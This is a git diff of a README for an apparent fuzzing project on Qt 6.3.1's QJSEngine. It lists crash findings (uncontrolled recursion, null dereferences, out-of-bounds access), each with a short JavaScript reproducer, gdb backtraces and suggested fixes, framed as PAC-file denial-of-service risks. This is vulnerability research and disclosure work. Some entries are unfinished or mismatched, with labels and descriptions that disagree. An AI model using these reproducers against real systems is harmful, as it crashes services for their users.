@@ -16,6 +16,7 @@ Target Resources
 - [JIT Optimization Configs](https://doc.qt.io/qt-5/qtqml-javascript-finetuning.html)
 - [QObject Docs](https://doc.qt.io/qt-5/qobject.html)
 - [Qt V4 Engine Docs](https://wiki.qt.io/V4)
+- [Javascript Hidden Types](https://draft.li/blog/2016/12/22/javascript-engines-hidden-classes/)
 
 Fuzzer Resources
 - [Fuzzilli](https://github.com/googleprojectzero/fuzzilli)
@@ -214,7 +215,214 @@ In order to manually debug and have symbols available to us, qt must be built an
 
 `$ /path/to/qt-everywhere/qtbase/bin/qmake`
 
-the makefile must then be updated to include the -g C and CXX flag to produce debug output 
+the makefile must then be updated with the following changes:
+- CC =  clang
+- CXX =  clang++
+- CFLAGS += -ggdb -fsanitize=address -fno-omit-frame-pointer -fno-optimize-sibling-calls -std=c++17
+- CFLAGS replace -02 with -00
+- CXXFLAGS += -ggdb -fsanitize=address -fno-omit-frame-pointer -fno-optimize-sibling-calls -std=c++17
+- CXXFLAGS replace -02 with -00
+- LINK = clang++
+- LIBS += -ggdb -fsanitize=address
+
+
+
+
+
+## Interesting Finds
+
+#### Uncontrolled Recursion (QV4::RuntimeHelpers::ordinaryToPrimitive <-> QV4::RuntimeHelpers::objectDefaultValue)
+**Impact**
+Attacker that can advertise a malicious PAC file to the device can trigger a DoS
+
+**Description**
+CWE-674 Uncontrolled Recursion
+
+Since an element in the array is a pointer to the entire array, the engine attempts to continually allocate and reallocate memory within the heap for new arrays at each level of recursion. This results in the heap space being continually populated with hidden types and the stack being populated with the elements of the array which continually expand to include an increasing number of redundant pointers and data. This happens until the stack runs out of space and segfaults
+
+**Reproduction**
+```
+let v1 = [-1.0,-1.0,-1.0];
+v1[1] = v1;
+const v2 = v1--;
+```
+
+**Remediation**
+To avoid this error two mitigations can be taken:
+- use a `depth` variable that is passed as a parameter between `QV4::RuntimeHelpers::ordinaryToPrimitive()` and `QV4::RuntimeHelpers::objectDefaultValue()` and incremented with each call so it can be used to dissalow recursion past a certain depth
+- perform a check within `QArrayDataPointer<char16_t>::reallocateAndGrow()` to make sure reallocation of an array does not continue indefinitely when the array contains a pointer to itself as an element
+
+#### Null Pointer Dereference (QV4::ArrayPrototype::method_values)
+**Impact**
+Attacker that can advertise a malicious PAC file to the device can trigger a DoS
+
+**Description**
+CWE-476: NULL Pointer Dereference
+
+The Symbol.iterator returns an undefined function which when being used as a callback with the builtin Array `reduce() causes a crash via null pointer dereference. The QV4::ArrayPrototype::MethodValues() function takes the null pointer and attempts to dereference the null pointer in order to construct a `ScopedObject` out of it without first checking if its null
+
+**Reproduction**
+```
+const v2 = [1,1,1,1];
+const v5 = v2[Symbol.iterator];
+const v7 = [2,2,2,2];
+const v9 = v7["reduce"](v5);
+```
+
+**Remediation**
+Addition of a null-pointer check before dereferencing it in `QV4::ArrayPrototype::method_values()`
+
+
+#### Null-Pointer Dereference (QV4::ExecutionEngine::newPromiseObject)
+**Impact**
+Attacker that can advertise a malicious PAC file to the device can trigger a DoS
+
+**Description**
+CWE-476: NULL Pointer Dereference
+
+QV4::ExecutionEngine::newPromiseObject dereferences the parameterized object in order to create a ScopedObject from it without first checking if the pointer is NULL. This results in a null-dereference that crashes the process
+
+**Reproduction**
+```
+const v1 = Object();                                                     
+const v4 = Object();                                                     
+const v6 = [v1];                                                         
+const v7 = Promise.resolve;                                              
+const v8 = Reflect.apply(v7,v4,v6);  
+```
+
+**Remediation**
+Within `QV4::ExecutionEngine::newPromiseObject`, the parameter `thisObject` should be verified to be non-NULL before it is dereferenced in the creation of a `ScopedObject` on the 10th line of the function.
+
+
+#### Null Pointer Dereference (qv4stringobject.cpp - getThisString)
+**Impact**
+Attacker that can advertise a malicious PAC file to the device can trigger a DoS
+
+**Description**
+CWE-476: NULL Pointer Dereference
+
+the getThisString function within the qv4stringobject.cpp file contains the potential for a null-dereference due to a lack of input validation before dereferencing its `thisObject` parameter when creating a string representation of it in the first line of the function
+
+**Reproduction**
+```
+const v2 = ["i68jdS1zZC"];
+const v3 = "i68jdS1zZC".endsWith;
+const v4 = v2.reduceRight(v3,3769255543);
+```
+
+**Remediation**
+Before attempting to dereference a member of the `thisObject` parameter in the first line of the function, the input should be validated to guarantee that it is not null
+
+
+#### Null Pointer Dereference (QV4::RegExpPrototype::method_compile)
+**Impact**
+Attacker that can advertise a malicious PAC file to the device can trigger a DoS
+
+**Description**
+CWE-476: NULL Pointer Dereference
+
+Defect Location: qt-everywhere-src-6.3.1/qtdeclarative/src/qml/jsruntime/qv4regexpobject.cpp:941
+
+The QV4::RegExpPrototype::method_compile function contains the potential for null-dereference due to a lack of input validation before dereferencing its `thisObject` parameter in the following line of code:
+
+`Scoped<RegExpObject> r(scope, thisObject->as<RegExpObject>());`
+
+**Reproduction**
+```
+const v0 = {};
+const v1 = [v0,v0,v0,v0,v0];
+const v3 = /[\d(Y)?]/ui;
+const v4 = ["species"];
+const v5 = v3.compile;
+const v7 = v4["reduceRight"](v5,v1);
+```
+
+**Remediation**
+Before attempting to dereference a member of the `thisObject` parameter in the first line of the function, the input should be validated to guarantee that it is not null
+
+
+#### Null Pointer Dereference (QV4::ArrayPrototype::method_toString)
+**Impact**
+Attacker that can advertise a malicious PAC file to the device can trigger a DoS
+
+**Description**
+CWE-476: NULL Pointer Dereference
+
+Defect Location: qt-everywhere-src-6.3.1/qtdeclarative/src/qml/jsruntime/qv4arrayobject.cpp:360
+
+`QV4::ArrayPrototype::method_toString` dereferences its `toObject` parameter to create a `ScopedObject` on the second line of the function before first validating the input to guarantee it is not null, leading to the possibility for a null-dereference and subsequent crash of the process.
+
+**Reproduction**
+```
+const v1 = [3769255543,3769255543,3769255543,3769255543];
+let {"constructor":v2,"length":v3,"toString":v4,} = v1;
+const v6 = [3769255543,3769255543,3769255543,3769255543];
+const v7 = v6.reduce(v4);
+```
+
+**Remediation**
+Addition of input validation to guarantee against the parameter being null before dereferencing it in the second line `QV4::ArrayPrototype::method_toString()`
+
+#### Uncontrolled Recursion (QV4::ProxyObject::virtualGet <-> QV4::Object::internalGet)
+*Vulnerability Type*:
+CWE-674 Uncontrolled Recursion
+
+*Impact*
+Denial of Service
+
+*Description*:
+seems to be a resource exhaustion issue where `QV4::Object::internalGet` gets called repeatedly (due to the do while loop) until crash due to the creation of a proxy whose handler has its `__proto__` property set to the original proxy within a do while loop.
+
+An interesting feature of this crash is that removing the loop causes the execution to succeed, so it doesn't seem to be simply an issue with the self-reference in the form of the proxy's handler having a property which points to the original proxy, but instead only crashes when v9.__proto__ is set to v11 **repeatedly**. The function executes through [VME::Exec](https://code.woboq.org/qt5/qtdeclarative/src/qml/jsruntime/qv4vme_moth.cpp.html#_ZN3QV44Moth3VME4execEPNS_13CppStackFrameEPNS_15ExecutionEngineE) and then VME:: interpret it then crashes in an call to Object::internalGet.
+
+*Crash-Inducing Code*:
+```
+const v9 = {};
+const v11 = new Proxy(Object,v9);
+do {
+    v9.__proto__ = v11;
+} while (1);
+```
+
+*Backtrace*:
+```
+#0  0x00007ffff7c8d053 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#1  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#2  0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#3  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#4  0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#5  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#6  0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#7  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#8  0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#9  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#10 0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#11 0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#12 0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#13 0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+#14 0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
+   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
+(More stack frames follow...)
+```
+
+*Similar Crashes Folder*:
+`results/crashes/reviewed/proxy-looped-self-reference`
+
 
 
 #### Promise Handling (098B393B31C6_deterministic.js)
@@ -259,257 +467,45 @@ const v8 = Reflect.apply(Promise.all, v1, v2);
 *Similar Crashes Folder*:
 `results/crashes/reviewed/promise-handling`
 
+#### User-Controlled Null-Dereference (F72E7A32F3DB_deterministic.js
 
-#### Uncontrolled Recursion (0C8904CC08B8_deterministic.js)
-*Vulnerability Type*:
-CWE-674 Uncontrolled Recursion
+**Impact**
+Attacker that can advertise a malicious PAC file to the device can trigger a DoS
 
-*Description*:
-Looks like a self reference issue. Where QJSengine tries to recursively resolve an array that references itself. The recursion is happening in [qv4value](https://code.woboq.org/qt5/qtdeclarative/src/qml/jsruntime/qv4value.cpp.html#_ZNK3QV45Value9toQStringEv) on lines 203-206. This happens because the arrays primitive resolves to itself.
+**Description**
+CWE-476: NULL Pointer Dereference
 
-*Crash-Inducing Code*:
+It seems like due to the segfault only occuring when the length of the array is greater than 555840, we are accessing memory that is out of bounds of the allocated memory we obtained for the array. The call to .includes() seems to search the whole arrray and lead to a search within an unauthorized region of memory
+
+**Reproduction**
 ```
-let v1 = [-1.0,-1.0,-1.0];
-v1[1] = v1;
-const v2 = v1--;
+const v1 = [];
+v1[277913] = 2;
+// 277913 is the smallest number that it will seg fault with 
+let [...v4] = v1;
 ```
 
-*Backtrace*:
-```
-#0  0x00007ffff7cbe9b1 in QV4::RuntimeHelpers::ordinaryToPrimitive(QV4::ExecutionEngine*, QV4::Object const*, QV4::String*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#1  0x00007ffff7cbed54 in QV4::RuntimeHelpers::objectDefaultValue(QV4::Object const*, int) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#2  0x00007ffff7ceeaf2 in QV4::Value::toQString() const () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#3  0x00007ffff7c04846 in QV4::ArrayPrototype::method_join(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#4  0x00007ffff7c0210a in QV4::ArrayPrototype::method_toString(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#5  0x00007ffff7cbea03 in QV4::RuntimeHelpers::ordinaryToPrimitive(QV4::ExecutionEngine*, QV4::Object const*, QV4::String*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#6  0x00007ffff7cbed54 in QV4::RuntimeHelpers::objectDefaultValue(QV4::Object const*, int) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#7  0x00007ffff7ceeaf2 in QV4::Value::toQString() const () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#8  0x00007ffff7c04846 in QV4::ArrayPrototype::method_join(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#9  0x00007ffff7c0210a in QV4::ArrayPrototype::method_toString(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#10 0x00007ffff7cbea03 in QV4::RuntimeHelpers::ordinaryToPrimitive(QV4::ExecutionEngine*, QV4::Object const*, QV4::String*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#11 0x00007ffff7cbed54 in QV4::RuntimeHelpers::objectDefaultValue(QV4::Object const*, int) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#12 0x00007ffff7ceeaf2 in QV4::Value::toQString() const () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#13 0x00007ffff7c04846 in QV4::ArrayPrototype::method_join(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#14 0x00007ffff7c0210a in QV4::ArrayPrototype::method_toString(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-(More stack frames follow...)
-````
+**Remediation**
 
-*Similar Crashes Folder*:
-`results/crashes/reviewed/self-reference`
+**References**
 
 #### Array Iterator Error (161BC301CCA5_deterministic.js)
-*Description*:
+**Impact**
+
+**Description**
  Indices greater than 277913 and less than ~32 bit int max will cause arbitrary data to be written outside of the array. When the data is deref'd by the spread operator, we segfault. Crashes in Chrome as well. The spread ... operator copies the v1 array which is where it crashes
 note uint max size is 0 to 4 294 967 295. Limiting the size of the array
 
-
-*Responsible Code*:
-```
-ReturnedValue Runtime::DestructureRestElement::call(ExecutionEngine *engine, const Value &iterator)
-{
-    Q_ASSERT(iterator.isObject());
-    Scope scope(engine);
-    ScopedArrayObject array(scope, engine->newArrayObject());
-    array->arrayCreate();
-    uint index = 0;
-    while (1) {
-        ScopedValue n(scope);
-        ScopedValue done(scope, IteratorNext::call(engine, iterator, n));
-        if (engine->hasException)
-            return Encode::undefined();
-        Q_ASSERT(done->isBoolean());
-        if (done->booleanValue())
-            break;
-        array->arraySet(index, n);
-        ++index;
-    }
-    return array->asReturnedValue();
-}
-```
-
-*Crash-Inducing Code*:
+**Reproduction**
 ```
 const v1 = [];
 v1[4145569500] &= v1;
 let [v2,v3,,...v4] = v1;
 ````
 
-*Backtrace*:
-```
-#0  0x00007ffff7bfce80 in QV4::ArrayPrototype::method_values(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#1  0x00007ffff7bfee5c in QV4::ArrayPrototype::method_reduce(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#2  0x00007ffff7cc0c48 in QV4::Runtime::CallProperty::call(QV4::ExecutionEngine*, QV4::Value const&, int, QV4::Value*, int) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#3  0x00007ffff7cf11e2 in QV4::Moth::VME::interpret(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*, char const*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#4  0x00007ffff7cf708f in QV4::Moth::VME::exec(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#5  0x00007ffff7c56ef0 in QV4::ArrowFunction::virtualCall(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#6  0x00007ffff7cbc60d in QV4::Runtime::CallName::call(QV4::ExecutionEngine*, int, QV4::Value*, int) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#7  0x00007ffff7cf116e in QV4::Moth::VME::interpret(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*, char const*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#8  0x00007ffff7cf708f in QV4::Moth::VME::exec(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#9  0x00007ffff7c554fa in QV4::Function::call(QV4::Value const*, QV4::Value const*, int, QV4::ExecutionContext*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#10 0x00007ffff7cc4fbc in QV4::Script::run(QV4::Value const*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#11 0x00007ffff7bef9d4 in QJSEngine::evaluate(QString const&, QString const&, int, QList<QString>*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#12 0x0000555555556491 in main (argc=<optimized out>, argc@entry=0x2, argv=argv@entry=0x7fffffffdf08) at harness.cpp:61
-#13 0x00007ffff709b7fd in __libc_start_main (main=0x555555556300 <main(int, char**)>, argc=0x2, argv=0x7fffffffdf08, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdef8)
-    at ../csu/libc-start.c:332
-#14 0x00005555555566ca in _start () at ../../../target/qt-everywhere-src-6.3.1/qtbase/include/QtCore/../../src/corelib/tools/qlist.h:418
-```
+**Remediation**
 
-*Similar Crashes Folder*:
-`results/crashes/reviewed/invalid-iterator-reduction`
-
-
-#### Proxy Looped Self Reference--Uncontrolled Recursion (06E132CAF6D_deterministic.js)
-*Vulnerability Type*:
-CWE-674 Uncontrolled Recursion
-
-*Description*:
-seems to be a resource exhaustion issue where `QV4::Object::internalGet` gets called repeatedly (due to the do while loop) until crash due to the creation of a proxy whose handler has its `__proto__` property set to the original proxy within a do while loop.
-
-An interesting feature of this crash is that removing the loop causes the execution to succeed, so it doesn't seem to be simply an issue with the self-reference in the form of the proxy's handler having a property which points to the original proxy, but instead only crashes when v9.__proto__ is set to v11 **repeatedly**. The function executes through [VME::Exec](https://code.woboq.org/qt5/qtdeclarative/src/qml/jsruntime/qv4vme_moth.cpp.html#_ZN3QV44Moth3VME4execEPNS_13CppStackFrameEPNS_15ExecutionEngineE) and then VME:: interpret it then crashes in an call to Object::internalGet.
-
-*Crash-Inducing Code*:
-```
-const v9 = {};
-const v11 = new Proxy(Object,v9);
-do {
-    v9.__proto__ = v11;
-} while (0 < 4);
-```
-
-*Backtrace*:
-```
-#0  0x00007ffff7c8d053 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#1  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#2  0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#3  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#4  0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#5  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#6  0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#7  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#8  0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#9  0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#10 0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#11 0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#12 0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#13 0x00007ffff7c7aaac in QV4::Object::internalGet(QV4::PropertyKey, QV4::Value const*, bool*) const ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#14 0x00007ffff7c8d055 in QV4::ProxyObject::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-(More stack frames follow...)
-```
-
-*Similar Crashes Folder*:
-`results/crashes/reviewed/proxy-looped-self-reference`
-
-
-#### Invalid Symbol.iterator Reduction (570A23225EA1_deterministic.js)
-*Description*:
-The Symbol.iterator provides a way to define the default iterator for an object. v5 stores the default iterator for v2 and when reduce is called, an attempt it made to reduce v7 to a single value according to the function provided by v5
-
-*Crash-Inducing Code*:
-```
-const v2 = [1,1,1,1];
-const v5 = v2[Symbol.iterator];
-const v7 = [2,2,2,2];
-const v9 = v7["reduce"](v5);
-```
-
-*Backtrace*:
-```
-#0  0x00007ffff7bfce80 in QV4::ArrayPrototype::method_values(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#1  0x00007ffff7bfee5c in QV4::ArrayPrototype::method_reduce(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#2  0x00007ffff7cc0c48 in QV4::Runtime::CallProperty::call(QV4::ExecutionEngine*, QV4::Value const&, int, QV4::Value*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#3  0x00007ffff7cf11e2 in QV4::Moth::VME::interpret(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*, char const*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#4  0x00007ffff7cf708f in QV4::Moth::VME::exec(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#5  0x00007ffff7c56ef0 in QV4::ArrowFunction::virtualCall(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#6  0x00007ffff7cbc60d in QV4::Runtime::CallName::call(QV4::ExecutionEngine*, int, QV4::Value*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#7  0x00007ffff7cf116e in QV4::Moth::VME::interpret(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*, char const*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#8  0x00007ffff7cf708f in QV4::Moth::VME::exec(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#9  0x00007ffff7c554fa in QV4::Function::call(QV4::Value const*, QV4::Value const*, int, QV4::ExecutionContext*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#10 0x00007ffff7cc4fbc in QV4::Script::run(QV4::Value const*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#11 0x00007ffff7bef9d4 in QJSEngine::evaluate(QString const&, QString const&, int, QList<QString>*) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#12 0x0000555555556491 in main (argc=<optimized out>, argc@entry=0x2, argv=argv@entry=0x7fffffffdf08) at harness.cpp:61
-#13 0x00007ffff709b7fd in __libc_start_main (main=0x555555556300 <main(int, char**)>, argc=0x2, argv=0x7fffffffdf08, init=<optimized out>, 
-    fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdef8) at ../csu/libc-start.c:332
-#14 0x00005555555566ca in _start () at ../../../target/qt-everywhere-src-6.3.1/qtbase/include/QtCore/../../src/corelib/tools/qlist.h:418
-```
-
-*Similar Crashes Folder*:
-`results/crashes/reviewed/invalid-iterator-reduction`
-
-#### Array OOB Read (F72E7A32F3DB_deterministic.js
-*Description*:
-It seems like due to the segfault only occuring when the length of the array is greater than 555840, we are accessing memory that is out of bounds of the allocated memory we obtained for the array. The call to .includes() seems to search the whole arrray and lead to a search within an unauthorized region of memory
-
-*Crash-Inducing Code*:
-````
-const v2 = new Int16Array(555840);
-const v3 = v2.includes();
-````
-
-*Backtrace*:
-````
